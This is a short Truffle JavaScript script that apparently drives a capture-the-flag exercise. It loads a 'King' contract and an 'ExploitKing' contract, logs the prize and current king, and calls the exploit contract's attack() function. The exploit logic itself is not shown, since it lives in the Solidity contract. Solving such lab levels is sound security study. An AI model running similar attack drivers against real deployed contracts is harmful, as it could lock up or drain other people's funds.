const contract = require('truffle-contract')
const ExploitKingArtifacts = require('../build/contracts/ExploitKing.json')
const ExploitKing = contract(ExploitKingArtifacts);
const KingArtifact = require('../build/contracts/King.json')
const King = contract(KingArtifact);

ExploitKing.setProvider(web3.currentProvider);
King.setProvider(web3.currentProvider);

King.deployed()
    .then(function (instance) {
        console.log("King", instance.address);
        instance.prize.call().then(prize => {
            console.log("Prize", prize);
        });
        instance.king.call().then(king => {
            console.log("Current King", king);
        });
    })
    .catch(function (error) {
        console.error(error);
    })


ExploitKing.deployed()
    .then(function (instance) {
        console.log("Exploit King", instance.address);
        instance.target.call().then(target => {
            console.log("Exploit King's Target", target);
        });
        instance.attack().then(function (result) {
            // result object contains import information about the transaction
            console.log(result);
        });
    })
    .catch(function (error) {
        console.error(error);
    })
